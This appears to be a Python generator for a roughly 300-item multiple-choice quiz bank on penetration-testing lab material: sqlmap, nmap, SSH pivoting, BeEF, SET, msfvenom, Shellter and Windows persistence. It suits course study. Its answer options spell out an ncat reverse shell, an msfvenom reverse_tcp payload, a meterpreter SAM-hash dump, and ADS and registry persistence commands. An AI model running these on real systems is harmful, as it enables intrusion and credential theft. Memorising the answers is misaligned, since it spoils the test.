"""
Generated question pool (≈300 questions) based on Labs 3–6 materials in this workspace.

Design goals:
- Keep the pool large without shipping a huge JSON file.
- Keep questions grounded in the lab PDFs/guide content (commands/options/workflows).
- Multi-answer questions are explicitly labeled in the question text.
"""

from __future__ import annotations

import hashlib
import random
from typing import Dict, List


def _q(
    qid: int,
    topic: str,
    question: str,
    options: Dict[str, str],
    correct: List[str],
    explanation: str = "",
    multi: bool = False,
) -> dict:
    # normalize keys
    options = {k.upper(): v for k, v in options.items()}
    correct = [c.upper() for c in correct]
    return {
        "id": qid,
        "topic": topic,
        "multi": multi,
        "question": question,
        "options": options,
        "correct": correct,
        "explanation": explanation,
    }


def _stable_seed(s: str) -> int:
    # Stable across runs (unlike Python's built-in hash()).
    digest = hashlib.sha256(s.encode("utf-8")).digest()
    return int.from_bytes(digest[:8], "big", signed=False)


def _mcq_from_pool(
    *,
    qid: int,
    topic: str,
    prompt: str,
    key: str,
    correct_meaning: str,
    pool: List[tuple],
    explanation: str,
) -> dict:
    """
    Build a 4-option MCQ where distractors are meanings from the same pool.
    Deterministic per (topic/prompt/key) so the bank is stable.
    """
    rng = random.Random(_stable_seed(f"{topic}|{prompt}|{key}"))
    other_meanings = [m for (k, m) in pool if m != correct_meaning]
    distractors = rng.sample(other_meanings, k=3) if len(other_meanings) >= 3 else other_meanings
    choices = [correct_meaning] + distractors
    # Ensure we always have 4 choices; pad (rare) with generic but still plausible strings.
    while len(choices) < 4:
        choices.append("Service/version enumeration option (see nmap/sqlmap help)")
    rng.shuffle(choices)

    letters = ["A", "B", "C", "D"]
    options = {letters[i]: choices[i] for i in range(4)}
    correct_letter = letters[choices.index(correct_meaning)]
    return _q(qid, topic, prompt, options, [correct_letter], explanation)


def get_questions() -> List[dict]:
    qs: List[dict] = []
    qid = 1

    # -----------------------------
    # Lab 3 — DVWA / sqlmap / ZAP
    # -----------------------------
    qs.append(
        _q(
            qid,
            "Lab3",
            "In DVWA + sqlmap (low security), why is the session cookie needed?",
            {
                "A": "To identify the target OS for sqlmap automatically",
                "B": "Because DVWA requires an authenticated session to access vulnerable endpoints",
                "C": "To enable DNS resolution in nmap",
                "D": "To encrypt the HTTP traffic",
            },
            ["B"],
            "Lab 3 shows grabbing PHPSESSID/security cookies to scan within an authenticated DVWA session.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab3",
            "DVWA medium security changes SQLi testing mainly because the vulnerable form becomes:",
            {
                "A": "A GET form, so sqlmap must use --method=GET",
                "B": "A POST form, so sqlmap must send parameters in the body (e.g., --method=POST --data=...)",
                "C": "A WebSocket, so sqlmap cannot be used",
                "D": "A DNS query, so you need responder.py",
            },
            ["B"],
            "Lab 3 notes the form changes to POST in DVWA medium and sqlmap must use --method=POST with --data.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab3",
            "This question has MORE THAN ONE correct answer: Which DVWA configuration changes are explicitly mentioned to enable testing? (Select ALL that apply)",
            {
                "A": "Set database user/password in DVWA config from /etc/mysql/debian.cnf",
                "B": "Set allow_url_include = On in PHP config",
                "C": "Change permissions for DVWA upload and phpids log files",
                "D": "Enable DNSSEC validation in Apache",
            },
            ["A", "B", "C"],
            "Lab 3 lists db_user/db_password, allow_url_include=On, and chmod changes for uploads/phpids log.",
            multi=True,
        )
    )
    qid += 1

    lab3_cookie_sources = [
        ("Developer tools", "A"),
        ("Browser cookie settings", "B"),
        ("Wireshark", "C"),
    ]
    for source, correct_letter in lab3_cookie_sources:
        qs.append(
            _q(
                qid,
                "Lab3",
                f"In the lab, one method to grab DVWA cookies for sqlmap is: {source}",
                {
                    "A": "Developer tools",
                    "B": "Browser cookie settings",
                    "C": "Wireshark (inspect successful HTTP request)",
                    "D": "proxychains.conf",
                },
                [correct_letter],
                "Lab 3 mentions multiple ways: devtools, browser settings, Wireshark.",
            )
        )
        qid += 1

    qs.append(
        _q(
            qid,
            "Lab3",
            "Which ZAP artifact is created by recording a login flow for authentication in the lab?",
            {
                "A": "A Zest authentication script",
                "B": "A CVE entry",
                "C": "A Kerberos TGT",
                "D": "An LM hash",
            },
            ["A"],
            "Lab 3 says to create a Zest script by recording browser login, then set it in the context.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab3",
            "The Lab 3 slides warn that ZAP scanning can be destructive. One example given is:",
            {
                "A": "Admin password may be changed via CSRF functionality",
                "B": "It always formats the disk",
                "C": "It disables the network card permanently",
                "D": "It upgrades DVWA to the latest version automatically",
            },
            ["A"],
            "Lab 3 notes scans can change admin password (CSRF) or drop DVWA tables.",
        )
    )
    qid += 1

    sqlmap_flags = [
        ("--dbs", "List database names"),
        ("--dump", "Dump table data"),
        ("--current-user", "Retrieve current DB user"),
        ("--is-dba", "Check if current user is DBA"),
        ("--tables", "List tables for a DB (requires -D)"),
        ("--columns", "List columns for a table (requires -D and -T)"),
        ("--method=POST", "Force HTTP method to POST"),
        ("--data", "Send parameters in the request body"),
        ("--cookie", "Send session cookies"),
        ("--referer", "Set HTTP referer header"),
    ]
    for flag, meaning in sqlmap_flags:
        qs.append(
            _q(
                qid,
                "Lab3",
                f"In sqlmap usage for DVWA, what is the purpose of `{flag}`?",
                {
                    "A": meaning,
                    "B": "Enable DNSSEC validation",
                    "C": "Switch nmap scan type to SYN",
                    "D": "Create a Kerberos ticket",
                },
                ["A"],
                "Based on the sqlmap slides/lab guide options list.",
            )
        )
        qid += 1

    # -----------------------------
    # Lab guide — nmap / ncat / pivoting / proxychains
    # -----------------------------
    nmap_flags = [
        ("-sn", "Host discovery only (no port scan)"),
        ("-n", "No DNS resolution"),
        ("-PP", "ICMP timestamp request discovery"),
        ("-sS", "SYN scan (default when root)"),
        ("-sT", "TCP connect scan (used for pivoting/proxy)"),
        ("-sX", "XMAS scan (FIN/PSH/URG)"),
        ("-sV", "Service version detection"),
        ("-O", "OS detection"),
        ("-A", "Aggressive (-sV, -O, scripts, traceroute)"),
        ("-sI", "Idle/Zombie scan"),
        ("-Pn", "Treat host as up (skip ping)"),
    ]
    for flag, meaning in nmap_flags:
        qs.append(
            _q(
                qid,
                "LabGuide",
                f"In the lab guide, what does `{flag}` mean/do?",
                {
                    "A": meaning,
                    "B": "Starts Metasploit database",
                    "C": "Creates a scheduled task",
                    "D": "Creates an ADS stream",
                },
                ["A"],
                "Directly from the Lab guide descriptions.",
            )
        )
        qid += 1

    # proxychains / pivoting constraints
    qs.append(
        _q(
            qid,
            "LabGuide",
            "When scanning through proxychains, which nmap scan type is required?",
            {
                "A": "-sS (SYN scan)",
                "B": "-sT (TCP connect scan)",
                "C": "-sI (Idle scan)",
                "D": "-sX (XMAS scan)",
            },
            ["B"],
            "The guide states SYN scans don't work via proxy; use -sT (and often -Pn).",
        )
    )
    qid += 1

    # ncat blocks
    ncat_examples = [
        ("File receiver", "ncat -lp 8888 > archivo_recibido.txt"),
        ("File sender", "ncat <IP> 8888 < archivo_a_enviar.txt"),
        ("Reverse shell attacker", "ncat -lvvp 443"),
        ("Reverse shell victim", "ncat 192.168.0.66 443 -e /bin/bash"),
        ("SSL server", "ncat -lp 8083 -c '...' -k --ssl --ssl-key k.pem --ssl-cert c.pem"),
        ("SSL client", "ncat --ssl 127.0.0.1 8083"),
        ("SSL verify client", "ncat --ssl --ssl-verify --ssl-trustfile c.pem 127.0.0.1 8083"),
    ]
    for label, cmd in ncat_examples:
        qs.append(
            _q(
                qid,
                "LabGuide",
                f"Which command corresponds to: {label}?",
                {"A": cmd, "B": "sqlmap -u ... --dbs", "C": "msfconsole -r meta_config", "D": "schtasks /create ..."},
                ["A"],
                "Commands are listed in the Lab guide ncat section.",
            )
        )
        qid += 1

    # SSH tunneling options
    ssh_options = [
        ("-f", "Fork to background after auth (run in background)"),
        ("-N", "Do not execute remote command (tunnel only)"),
        ("-T", "Disable pseudo-TTY allocation"),
        ("-R", "Remote port forwarding"),
        ("-L", "Local port forwarding"),
        ("-D", "Dynamic port forwarding (SOCKS proxy)"),
    ]
    for opt, meaning in ssh_options:
        qs.append(
            _q(
                qid,
                "LabGuide",
                f"In SSH tunneling, what does `{opt}` do (as used in the lab guide)?",
                {"A": meaning, "B": "Enables XSS hook", "C": "Sets DVWA security to low", "D": "Loads kiwi module"},
                ["A"],
                "Explained in the pivoting section of the Lab guide.",
            )
        )
        qid += 1

    # proxychains config snippet
    qs.append(
        _q(
            qid,
            "LabGuide",
            "In the reverse SOCKS proxy setup, proxychains is configured to use:",
            {
                "A": "socks4 127.0.0.1 5555",
                "B": "http 127.0.0.1 8080",
                "C": "https 10.0.3.66 8443",
                "D": "ssh 127.0.0.1 22",
            },
            ["A"],
            "The guide appends `socks4 127.0.0.1 5555` under [ProxyList].",
        )
    )
    qid += 1

    # -----------------------------
    # Lab 4 — BeEF + Metasploit + WebIDL + rewriting
    # -----------------------------
    qs.append(
        _q(
            qid,
            "Lab4",
            "In the BeEF lab, the two main XSS delivery approaches are:",
            {
                "A": "Reflected XSS (link-based) and Stored XSS (server-side trap)",
                "B": "SQL injection and command injection",
                "C": "ARP poisoning and SYN flood",
                "D": "Kerberoasting and Golden Ticket",
            },
            ["A"],
            "The BeEF lab describes reflected vs stored XSS and focuses on stored XSS.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab4",
            "DVWA 1.9 anti-CSRF mechanism described in the BeEF lab uses:",
            {
                "A": "A hidden token (user token) separate from PHPSESSION cookie",
                "B": "Only the PHPSESSION cookie, no additional token",
                "C": "DNSSEC signatures",
                "D": "Kerberos tickets",
            },
            ["A"],
            "The lab explains user token CSRF values are independent of PHPSESSION cookie.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab4",
            "To integrate BeEF with Metasploit in the lab, which Metasploit plugin is loaded?",
            {"A": "msgrpc", "B": "kiwi", "C": "meterpreter", "D": "nops"},
            ["A"],
            "The lab uses `load msgrpc ServerHost=127.0.0.1 Pass=...` for BeEF↔MSF integration.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab4",
            "This question has MORE THAN ONE correct answer: In the BeEF configuration changes, which are explicitly recommended? (Select ALL that apply)",
            {
                "A": "Change default BeEF UI credentials",
                "B": "Disable geoip (offline environment)",
                "C": "Enable metasploit extension and disable requester/xssrays (recommended)",
                "D": "Enable CVSS scoring in BeEF",
            },
            ["A", "B", "C"],
            "The lab recommends changing credentials, disabling geoip, enabling metasploit and disabling requester/xssrays.",
            multi=True,
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab4",
            "The BeEF lab uses the Metasploit browser exploit 'Firefox WebIDL Privileged JavaScript Injection' to target:",
            {
                "A": "CVE-2014-1510 / CVE-2014-1511",
                "B": "CVE-2008-1447 (Kaminsky DNS)",
                "C": "CVE-2023-20101 (Cisco static creds)",
                "D": "CVE-2019-0708 (BlueKeep)",
            },
            ["A"],
            "The BeEF lab explicitly mentions CVE-2014-1510 and CVE-2014-1511.",
        )
    )
    qid += 1

    # WebIDL options (SRVHOST, SRVPORT, URIPATH, CONTENT, LHOST, LPORT)
    webidl_opts = [
        ("SRVHOST", "IP address of the exploit web server"),
        ("SRVPORT", "Port of the exploit web server"),
        ("URIPATH", "Path component of the exploit URL"),
        ("LHOST", "Attacker listener IP for reverse shell"),
        ("LPORT", "Attacker listener port for reverse shell"),
    ]
    for opt, meaning in webidl_opts:
        qs.append(
            _q(
                qid,
                "Lab4",
                f"In the WebIDL exploit setup, what does {opt} define?",
                {"A": meaning, "B": "DVWA security level", "C": "SQLMap DBMS", "D": "proxychains SOCKS port"},
                ["A"],
                "From the BeEF lab 'Attack' section parameters.",
            )
        )
        qid += 1

    url_rewrite_methods = [
        "Replace HREFs",
        "Replace HREFs (click events)",
        "Replace HREFs (HTTPS)",
        "Replace HREFs (TEL)",
    ]
    qs.append(
        _q(
            qid,
            "Lab4",
            "This question has MORE THAN ONE correct answer: Which URL rewriting options are listed in the BeEF lab? (Select ALL that apply)",
            {
                "A": url_rewrite_methods[0],
                "B": url_rewrite_methods[1],
                "C": url_rewrite_methods[2],
                "D": url_rewrite_methods[3],
            },
            ["A", "B", "C", "D"],
            "All four are listed in the lab section on URL rewriting.",
            multi=True,
        )
    )
    qid += 1

    # -----------------------------
    # Lab 5 — SET / Harvester / msfvenom / Veil
    # -----------------------------
    qs.append(
        _q(
            qid,
            "Lab5",
            "In SET HTA Attack method, which files are copied from /root/.set into the Apache directory to serve the malicious page?",
            {
                "A": "web_clone/index.html, hta_index, Launcher.hta",
                "B": "postgresql.conf, database.yml, pg-utf8.sql",
                "C": "authorized_keys, known_hosts, ssh_config",
                "D": "k.pem, c.pem, cacerts",
            },
            ["A"],
            "Lab 5 materials describe copying index.html, hta_index, Launcher.hta into /var/www/html.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab5",
            "In the SET credential harvester workflow, which file handles capturing POSTed credentials?",
            {"A": "post.php", "B": "hook.js", "C": "msf-exploits.cache", "D": "cacerts"},
            ["A"],
            "The harvester generates post.php plus a harvest*.txt log; post.php captures POSTs.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab5",
            "Which msfvenom command (as shown) creates a Windows x86 meterpreter reverse TCP executable?",
            {
                "A": "msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.0.3.66 LPORT=8443 -f exe -o payload.exe",
                "B": "nmap -sV --script vuln 10.0.3.149",
                "C": "sqlmap -u http://... --dbs",
                "D": "openssl req -new -x509 -keyout k.pem -nodes -out c.pem",
            },
            ["A"],
            "This msfvenom example appears in the Lab 5 materials.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab5",
            "In the Veil workflow, what is the purpose of the generated .rc handler file?",
            {
                "A": "It configures Metasploit to start the correct listener for the generated payload",
                "B": "It patches the Windows kernel",
                "C": "It disables antivirus permanently",
                "D": "It turns a GET request into POST",
            },
            ["A"],
            "Veil writes a Metasploit resource file that can be loaded with `resource <file>.rc`.",
        )
    )
    qid += 1

    # -----------------------------
    # Lab 6 — Shellter / Diskmon / ADS / persistence / kiwi
    # -----------------------------
    qs.append(
        _q(
            qid,
            "Lab6",
            "In Shellter + Diskmon (stealth mode), which EXITFUNC setting is recommended/required in the handler?",
            {"A": "thread", "B": "process", "C": "seh", "D": "none"},
            ["A"],
            "Lab 6 stresses EXITFUNC=thread when using stealth mode with Shellter/Metasploit.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab6",
            "In the lab, the infected Diskmon.exe is transferred to the victim using:",
            {
                "A": "A Python HTTP server (SimpleHTTPServer) and downloading from the browser",
                "B": "DNS tunneling",
                "C": "Kerberos delegation",
                "D": "Bluetooth LE",
            },
            ["A"],
            "Lab 6 uses python -m SimpleHTTPServer to serve Diskmon.exe for download.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab6",
            "Which meterpreter command sequence is used in the lab to dump local SAM hashes (after enabling kiwi)?",
            {
                "A": "load kiwi; getsystem; getuid; lsa_dump_sam",
                "B": "search webidl; set SRVHOST; run -j",
                "C": "sqlmap --dbs; --dump; --os-shell",
                "D": "nmap -sn; ncat -lp 8083",
            },
            ["A"],
            "Lab 6 shows load kiwi, getsystem, then lsa_dump_sam.",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab6",
            "Which Windows feature is used in the lab to hide a payload inside a normal-looking file like validated_license.lic?",
            {
                "A": "NTFS Alternate Data Streams (ADS)",
                "B": "DNSSEC",
                "C": "Kerberos tickets",
                "D": "BGP route injection",
            },
            ["A"],
            "Lab 6 hides executables using file:stream syntax (ADS).",
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab6",
            "This question has MORE THAN ONE correct answer: Which persistence mechanisms are explicitly used in Lab 6? (Select ALL that apply)",
            {
                "A": "Scheduled task created with schtasks on logon",
                "B": "HKCU ...CurrentVersion\\\\Run autorun (via meterpreter persistence)",
                "C": "DNS cache poisoning",
                "D": "ARP spoofing",
            },
            ["A", "B"],
            "The lab uses schtasks and HKCU Run persistence (meterpreter persistence script).",
            multi=True,
        )
    )
    qid += 1

    qs.append(
        _q(
            qid,
            "Lab6",
            "In the lab, which command hides the symlink on the Desktop so it doesn't show up in a normal dir listing?",
            {
                "A": "attrib +h /l check_license.exe",
                "B": "chmod a+wx hackable/uploads",
                "C": "set EXITFUNC thread",
                "D": "db_status",
            },
            ["A"],
            "Lab 6 uses attrib +h /l to mark the symlink hidden.",
        )
    )
    qid += 1

    # -----------------------------
    # Expand to ~300 by generating controlled variations from the same lab facts.
    # (Same knowledge, different question prompts) — good for rotation practice.
    # -----------------------------

    # 1) Nmap flag meaning variants
    for flag, meaning in nmap_flags:
        # create two phrasing variants each
        for phr in [
            f"Select the correct description of nmap option {flag}:",
            f"In the lab guide, the purpose of '{flag}' is:",
        ]:
            qs.append(
                _q(
                    qid,
                    "LabGuide",
                    phr,
                    {
                        "A": meaning,
                        "B": "Enable BeEF Metasploit integration",
                        "C": "Dump SAM hashes in meterpreter",
                        "D": "Generate a Veil payload",
                    },
                    ["A"],
                    "From the lab guide nmap fundamentals.",
                )
            )
            qid += 1

    # 2) SSH option meaning variants
    for opt, meaning in ssh_options:
        for phr in [
            f"Which statement best describes SSH option {opt} (as used in pivoting labs)?",
            f"SSH tunneling: {opt} means:",
        ]:
            qs.append(
                _q(
                    qid,
                    "LabGuide",
                    phr,
                    {
                        "A": meaning,
                        "B": "Sets DVWA security to medium",
                        "C": "Starts BeEF on port 3000",
                        "D": "Creates an ADS stream",
                    },
                    ["A"],
                    "From the pivoting SSH tunnel explanations in the lab guide.",
                )
            )
            qid += 1

    # 3) sqlmap flag variants
    for flag, meaning in sqlmap_flags:
        for phr in [
            f"In sqlmap, what does {flag} do?",
            f"Choose the best description for sqlmap option {flag}:",
        ]:
            qs.append(
                _q(
                    qid,
                    "Lab3",
                    phr,
                    {
                        "A": meaning,
                        "B": "Creates a scheduled task on Windows",
                        "C": "Changes a BeEF UI password",
                        "D": "Creates a SOCKS proxy on port 5555",
                    },
                    ["A"],
                    "Based on the sqlmap usage shown in Lab 3 materials.",
                )
            )
            qid += 1

    # 4) BeEF rewrite options variants
    for method in url_rewrite_methods:
        qs.append(
            _q(
                qid,
                "Lab4",
                "Which BeEF feature is part of URL rewriting options listed in the lab?",
                {"A": method, "B": "sqlmap --os-shell", "C": "proxychains strict_chain", "D": "schtasks /create"},
                ["A"],
                "From the BeEF lab URL rewriting section.",
            )
        )
        qid += 1

    # 5) SET + Veil command recognition variants (safe/high-level)
    set_steps = [
        ("APACHE_SERVER", "ON", "Enable Apache server mode in SET config"),
        ("APACHE_DIRECTORY", "/var/www/html", "Apache document root used by SET"),
    ]
    for key, value, meaning in set_steps:
        qs.append(
            _q(
                qid,
                "Lab5",
                f"In SET configuration, what does setting {key}={value} relate to?",
                {"A": meaning, "B": "ZAP CA certificate", "C": "NTFS ADS stream name", "D": "nmap OS detection"},
                ["A"],
                "From Lab 5 set.config preparation steps.",
            )
        )
        qid += 1

    # 6) Persistence technique recognition variants
    persistence_cmds = [
        ("schtasks /create ... /sc onlogon", "Schedule task runs on logon"),
        ("HKCU ...CurrentVersion\\\\Run", "Autorun registry key for user logon"),
        ("attrib +h /l <file>", "Hide the symlink/file in directory listings"),
        ("type <exe> > <file>:<stream>", "Hide executable in NTFS ADS stream"),
        ("mklink <link> <target>", "Create a symlink to an ADS stream executable"),
    ]
    for cmd, meaning in persistence_cmds:
        qs.append(
            _q(
                qid,
                "Lab6",
                "Which statement best matches this lab technique/command?",
                {"A": meaning, "B": "DVWA database reset", "C": "BeEF hook polling", "D": "sqlmap DB listing"},
                ["A"],
                "From Lab 6 hiding/persistence sections.",
            )
        )
        qid += 1

    # Ensure we have at least ~300 questions.
    # If still under, pad with additional phrasing variants from the same pools.
    target = 300
    pools = [
        ("LabGuide", nmap_flags, "nmap option"),
        ("LabGuide", ssh_options, "ssh option"),
        ("Lab3", sqlmap_flags, "sqlmap option"),
    ]
    while len(qs) < target:
        for topic, pool, label in pools:
            if len(qs) >= target:
                break
            for key, meaning in pool:
                if len(qs) >= target:
                    break
                qs.append(
                    _mcq_from_pool(
                        qid=qid,
                        topic=topic,
                        key=str(key),
                        prompt=f"[Variant] Choose the correct meaning of {label} `{key}`:",
                        correct_meaning=meaning,
                        pool=pool,
                        explanation="Variant question (same fact) for rotation practice.",
                    )
                )
                qid += 1

    # Re-assign IDs sequentially to guarantee uniqueness and clean ordering.
    for i, q in enumerate(qs, start=1):
        q["id"] = i

    return qs


